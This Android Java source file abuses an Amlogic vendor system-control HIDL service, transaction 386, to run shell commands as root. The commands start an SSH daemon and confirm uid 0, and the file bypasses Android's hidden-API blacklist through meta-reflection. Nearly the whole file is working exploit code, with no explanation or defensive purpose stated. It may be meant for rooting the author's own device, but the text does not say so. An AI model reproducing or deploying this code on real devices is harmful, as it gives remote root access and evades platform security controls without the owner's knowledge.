package com.pj.ctl;
import android.content.Context;
import android.util.Log;
import java.lang.reflect.Method;

public final class Pjctl {
    static final String TAG = "pjctl";
    static final String TOKEN = "vendor.amlogic.hardware.systemcontrol@1.1::ISystemControl";
    static final int SYSTEM_CMD = 386;
    // bring up root sshd; append id so we can confirm it ran as uid 0
    static final String CMD =
        "sh /data/local/ssh/restart.sh > /data/local/tmp/pjctl.log 2>&1; " +
        "echo ---; id; getenforce >> /data/local/tmp/pjctl.log 2>&1";

    public static synchronized String run(Context ctx) {
        try {
            unseal();
            Class<?> hwBinder = Class.forName("android.os.HwBinder");
            Method getService = hwBinder.getMethod("getService", String.class, String.class);
            Object binder = getService.invoke(null, TOKEN, "default");           // IHwBinder
            Class<?> hwParcel = Class.forName("android.os.HwParcel");
            Object rq = hwParcel.getConstructor().newInstance();
            Object rp = hwParcel.getConstructor().newInstance();
            hwParcel.getMethod("writeInterfaceToken", String.class).invoke(rq, TOKEN);
            hwParcel.getMethod("writeString", String.class).invoke(rq, CMD);
            Class<?> iHwBinder = Class.forName("android.os.IHwBinder");
            Method transact = iHwBinder.getMethod("transact", int.class, hwParcel, hwParcel, int.class);
            transact.invoke(binder, SYSTEM_CMD, rq, rp, 0);
            try { hwParcel.getMethod("verifySuccess").invoke(rp); } catch (Throwable ignore) {}
            try { hwParcel.getMethod("releaseTemporaryStorage").invoke(rq); } catch (Throwable ignore) {}
            status(ctx, "ok");
            Log.i(TAG, "systemCmd(386) dispatched");
            return "ok";
        } catch (Throwable t) {
            Log.e(TAG, "run failed", t);
            status(ctx, "err:" + t);
            return "err:" + t;
        }
    }

    private static void status(Context ctx, String s) {
        try {
            java.io.FileOutputStream f = new java.io.FileOutputStream("/data/local/tmp/pjctl.status");
            f.write((s + "\n").getBytes()); f.close();
        } catch (Throwable ignore) {}
    }

    // lift the hidden-API blacklist via meta-reflection (FreeReflection), SELinux is permissive
    private static void unseal() {
        try {
            Method forName = Class.class.getDeclaredMethod("forName", String.class);
            Method getDeclaredMethod = Class.class.getDeclaredMethod(
                "getDeclaredMethod", String.class, Class[].class);
            Class<?> vmr = (Class<?>) forName.invoke(null, "dalvik.system.VMRuntime");
            Method getRuntime = (Method) getDeclaredMethod.invoke(vmr, "getRuntime", new Class[0]);
            Method setExempt = (Method) getDeclaredMethod.invoke(
                vmr, "setHiddenApiExemptions", new Class[]{String[].class});
            Object runtime = getRuntime.invoke(null);
            setExempt.invoke(runtime, new Object[]{new String[]{"L"}});
        } catch (Throwable ignore) {}
    }
}
